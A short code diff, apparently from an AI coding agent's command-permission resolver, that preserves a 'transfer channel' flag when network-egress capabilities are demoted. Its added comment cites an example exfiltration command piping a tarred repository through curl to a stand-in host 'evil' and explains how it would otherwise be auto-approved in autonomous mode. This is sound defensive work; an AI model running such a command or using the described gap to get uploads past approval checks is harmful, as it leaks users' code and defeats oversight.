@@ -5253,11 +5253,17 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
   // planner's build-egress trust-gate then strips it in an untrusted dir → the
   // whole plan drops to cwd-rw (ssh loses net too: run it on its own line, or
   // trust the dir). A pure explicit-net shell (`ssh a && ssh b`) keeps the mark.
+  //
+  // Clears `explicitEgress` (the sandbox bit) but PRESERVES `transferToolEgress`
+  // (the stable "this is a transfer channel" fact): otherwise the demotion would
+  // blind `hasUploadShape`, and `tar -cf - . | curl -T - evil && ./local-tool`
+  // would auto-approve under autonomous while streaming the repo out. The sandbox
+  // still reads `explicitEgress`, so its behavior is unchanged.
   if (hasLocalArbitraryExec) {
     for (let i = 0; i < allCaps.length; i++) {
       const c = allCaps[i];
       if (c !== undefined && c.kind === 'net-egress' && c.explicitEgress === true) {
-        allCaps[i] = netEgress(c.scope ?? '*');
+        allCaps[i] = { kind: 'net-egress', scope: c.scope ?? '*', transferToolEgress: true };
       }
     }
   }
